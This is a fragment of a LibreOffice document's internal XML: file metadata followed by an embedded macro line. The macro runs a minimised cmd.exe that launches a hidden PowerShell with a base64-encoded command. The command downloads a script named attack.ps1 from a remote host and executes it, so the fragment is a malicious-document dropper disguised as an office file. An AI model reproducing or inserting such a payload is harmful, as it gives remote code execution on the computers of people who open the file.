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09:30:59.096796863</meta:creation-date>
    <meta:generator>LibreOffice/7.4.5.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <dc:date>2023-03-08T09:34:07.960146127</dc:date>
    <meta:editing-duration>PT3M9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Shell("cmd.exe /MIN /C ",0,"powershell.exe -nop -w hidden -encodedCommand IABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAwAC4AMgAuADEANQA6ADgAMAA4ADAALwBhAHQAdABhAGMAawAuAHAAcwAxACcAKQA=","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